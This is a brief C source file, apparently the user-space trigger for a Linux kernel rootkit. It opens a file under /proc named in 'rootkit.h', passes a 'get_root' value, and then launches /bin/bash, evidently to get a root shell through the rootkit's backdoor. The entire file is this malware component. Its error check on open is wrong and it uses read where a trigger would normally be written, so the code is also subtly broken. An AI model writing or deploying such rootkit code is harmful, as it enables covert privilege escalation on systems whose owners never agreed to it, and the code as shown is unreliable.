#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#include "rootkit.h"

char proc_file[64];

int main(int argc, char **argv){
    sprintf(proc_file, "/proc/%s", procfile);

    int fd = open(proc_file, O_RDONLY);

    if(!fd){
        printf("Error, can't open file %s\n", procfile);
        return -1;
    }

    read(fd, get_root, strlen(get_root));

    system("/bin/bash");

    return 0;
}

